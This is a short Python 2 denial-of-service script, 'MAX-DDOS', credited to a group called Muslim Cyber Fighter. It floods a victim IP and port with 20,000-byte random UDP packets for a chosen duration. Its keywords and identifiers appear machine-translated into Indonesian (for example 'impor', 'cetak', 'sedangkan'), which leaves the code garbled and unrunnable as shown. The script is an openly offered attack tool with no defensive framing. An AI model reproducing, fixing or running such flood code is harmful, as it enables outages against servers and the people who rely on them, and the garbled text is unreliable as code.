waktu impor
 soket impor
impor  acak
impor  sys
 penggunaan def ():
    cetak  " \ 033 [1; 32m ######################################## ############### "
    cetak  " ------------------------ [ \ 033 [1; 91mMAX-DDOS \ 033 [1; 32m] ------- --------------  "
    cetak  " ----------------------------------------------- --------  "
    cetak  " \ 033 [1; 91mCommand:"  "python2 MAXDDOS.py"  "[ip] [port] [packet]"



    cetak  " \ 033 [1; 91mSubscribe Channel: muslim cyber fighter "
    cetak  " \ 033 [1; 91mTEAM             : Muslim Cyber Fighter         \ 033 [1; 32m ------------"
    cetak  "                \ 033 [1; 91m <- [Muslim Cyber Fighter] ->          \ 033 [1; 32m #"
    cetak  "############################################# ######### "
    cetak  "@@@@@@@@@@"
    cetak  "@@@@@@@@@@@@"
    cetak  "@@@@@@@@@@@@@@@@"
def  banjir ( korban , vport , durasi ):
    # Dukung kami yaakk ... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu menunjukkan program tipe UDP
    klien  =  soket . soket ( soket . AF_INET , soket . SOCK_DGRAM )
    # 20000 representasi satu byte ke server
    byte  =  acak . _urandom ( 20000 )
    batas  waktu =   waktu . waktu () +  durasi
    terkirim  =  3000

    sedangkan  1 :
        jika  waktu . waktu () >  batas waktu :
            istirahat
        lain :
            lulus
        klien . sendto ( byte , ( korban , vport ))
        terkirim  =  terkirim  +  1
        cetak  " \ 033 [1; 91mMemulai \ 033 [1; 32m% s \ 033 [1; 91mmengirim serangan \ 033 [1; 32m% s \ 033 [1; 91mpada port \ 033 [1; 32m% s" % ( terkirim , korban , vport )
def  main ():
    cetak  len ( sys . argv )
    jika  len ( sys . argv ) ! =  4 :
        penggunaan ()
    lain :
        banjir ( sys . argv [ 1 ], int ( sys . argv [ 2 ]), int ( sys . argv [ 3 ]))

jika  __name__  ==  '__main__' :
    utama ()